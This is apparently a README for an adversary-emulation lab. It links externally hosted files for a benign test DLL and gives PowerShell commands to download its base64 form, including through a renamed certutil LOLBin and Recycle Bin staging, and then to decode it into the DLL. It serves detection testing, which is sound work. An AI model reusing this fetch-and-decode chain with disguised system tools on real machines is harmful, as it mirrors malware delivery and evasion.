# Lab payloads (hosted separately)

These lab/emulation payloads are **benign** and are **not committed to this repo** —
they're hosted externally so this package stays binary-free. Download them onto your lab VM from either mirror:

**GitHub Pages**
- https://nikolasbielski.github.io/files/upd.b64
- https://nikolasbielski.github.io/files/p.dll
- https://nikolasbielski.github.io/files/p.c

**Raw (equivalent)**
- https://raw.githubusercontent.com/NikolasBielski/nikolasbielski.github.io/refs/heads/main/files/upd.b64
- https://raw.githubusercontent.com/NikolasBielski/nikolasbielski.github.io/refs/heads/main/files/p.dll
- https://raw.githubusercontent.com/NikolasBielski/nikolasbielski.github.io/refs/heads/main/files/p.c

## What they are

| File | What it is |
|------|------------|
| `p.c` | Source of the benign lab DLL. It exports `Start`, which opens the default browser to a YouTube URL (visible proof of execution; no persistence, no other network/file I/O). |
| `p.dll` | The compiled 64-bit DLL. SHA256 `587E00339A4153638150FE5457A922E15ECF4442C4085DE66BDC729C27F55FB5`. |
| `upd.b64` | Headerless base64 of `p.dll` (so `certutil -decode` reconstructs it byte-for-byte, and `-urlcache -split` won't mis-parse it). |

## If you want to download it

Reliable (built-in `curl.exe`):
```powershell
$dst = 'C:\lab'   # or your $Recycle.Bin\<SID> staging folder
curl.exe -s -L -o "$dst\upd.b64" https://nikolasbielski.github.io/files/upd.b64
```

Via the renamed certutil (the lab's LOLBin path,  generates the ADE3-01 telemetry):
```powershell
& "$bin\svc_update.exe" -urlcache "https://nikolasbielski.github.io/files/upd.b64" delete 2>$null
& "$bin\svc_update.exe" -urlcache -f  "https://nikolasbielski.github.io/files/upd.b64" "$bin\upd.b64"
```

Verify, then decode:
```powershell
certutil -hashfile "$dst\upd.b64" SHA256     # optional
& "$bin\svc_update.exe" -decode "$bin\upd.b64" "$bin\p.dll"
```
